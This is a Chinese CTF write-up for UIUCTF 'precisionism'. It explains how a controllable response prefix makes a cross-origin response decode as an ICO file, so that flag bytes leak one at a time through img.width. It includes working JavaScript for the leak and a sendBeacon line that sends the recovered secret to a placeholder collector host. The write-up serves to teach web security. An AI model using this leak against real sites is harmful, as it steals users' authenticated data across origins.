# precisionism

## 题目简述

管理员机器人与 `modernism` 相同：给题目域设置包含 flag 的 `HttpOnly` Cookie，再访问攻击者 URL。应用允许在响应最前面插入任意十六进制字节，但这次还会在 flag 后追加固定文本：

```python
prefix = bytes.fromhex(request.args.get("p", ""))
flag = request.cookies.get("FLAG", "uiuctf{FAKEFLAG}").encode()
return Response(prefix + flag + b"Enjoy your flag!",
                mimetype="text/plain")
```

flag 格式固定为 `uiuctf{[0-9A-Za-z]{8}}`，总长 16 字节。固定后缀破坏了 `modernism` 的 UTF-16 JavaScript 技巧，因此要寻找一种跨域元素泄漏：浏览器不能把响应正文交给攻击者脚本，但加载图片后允许读取图片固有宽高。

## 解题过程

### 让响应被解析成 ICO

官方构造的初始前缀为：

```text
00000100020001010000010020006804000026000000
```

按字节拆解，它是一份 ICO 头和第一条目录项：

```text
00 00        reserved = 0
01 00        type = icon
02 00        image count = 2

01           first entry width = 1
01           first entry height = 1
00           color count
00           reserved
01 00        planes = 1
20 00        bit count = 32
68 04 00 00  resource size = 0x468
26 00 00 00  resource offset = 0x26
```

前缀长度是 22 字节，而 ICO 头占 6 字节，每条目录项占 16 字节。于是服务端紧随其后的 `flag[0]` 正好落在第二条目录项的 width 字段。Chromium 接受这份特殊 ICO，并把该字节暴露为 `HTMLImageElement.width`。

如果从前缀末尾删掉一个字节，flag 整体向前移动一位，第二条目录项的 width 就变成 `flag[1]`；删掉 $i$ 个字节时，宽度等于 `flag[i]`。后面的 flag 剩余字节和固定字符串为解析器提供了足够的目录项及资源数据。

### 逐字节读取跨域响应

图片可以跨域加载，不需要 CORS；攻击者脚本只读取非敏感外观属性 `width`。完整泄漏函数如下：

```javascript
async function leakByte(i) {
  let p = '00000100020001010000010020006804000026000000';
  if (i > 0) p = p.slice(0, -2 * i);

  const img = new Image();
  img.src = `https://TARGET/?p=${p}`;
  await img.decode();
  return img.width;
}

async function main() {
  let flag = '';
  for (let i = 0; i < 16; i++) {
    flag += String.fromCharCode(await leakByte(i));
  }

  navigator.sendBeacon('https://COLLECTOR/', flag);
}

main();
```

`p` 是十六进制文本，每个响应字节占两个字符，所以删除 $i$ 个字节必须截去 `2 * i` 个字符。仓库中留存的早期 `payload.html` 写成了 `slice(0, -i)`；当 $i$ 为奇数时会生成奇数长度十六进制串，`bytes.fromhex()` 直接报错，因此不能照抄该处。上面的写法与公开作者题解中的修正版一致。

将脚本放在攻击者控制的 HTTPS 页面，把页面 URL 提交给管理员 bot。每个 `<img>` 请求都会带上目标域的 Cookie；16 次请求分别把响应的第 0 至第 15 字节移入 width 字段，最终回传完整 flag。

### 为什么这是 XS-Leak 而不是响应读取

脚本从未访问图片像素、响应头或响应正文，也没有使用 `fetch` 绕过 CORS。跨域响应只进入浏览器的 ICO 解码器，泄漏的是解析后允许读取的尺寸元数据：

```text
秘密响应字节
  -> 被控制前缀定位为 ICO width
  -> 浏览器跨域解码
  -> img.width
  -> ASCII 字符
```

仓库元数据记录的结果为：

```text
uiuctf{gr92TwKp}
```

仓库解题说明还记录了一个 WAV 方向：控制 RIFF/WAVE 头后，追加字节会改变 `audio.duration`。不过它只说明同类“解析结果侧信道”思路；本题官方、稳定且足以泄漏 16 字节的路线是 ICO 宽度，因此不需要在正文依赖音频变体。

## 方法总结

- 核心技巧：把含秘密的跨域响应伪装成 ICO，通过调整前缀长度逐次把不同秘密字节对齐到目录项 width，再读取 `img.width` 完成 XS-Leak。
- 识别信号：可控响应前缀、紧随其后的短秘密、管理员 Cookie、跨域正文不可读，但浏览器仍允许加载图片并公开固有尺寸。
- 复用要点：文件格式不是只有 magic；必须精确计算头、目录项、偏移和长度字段。真实利用还要固定浏览器版本、等待 `decode()`、处理解析失败，并限制请求数以避免 bot 的 10 秒超时。
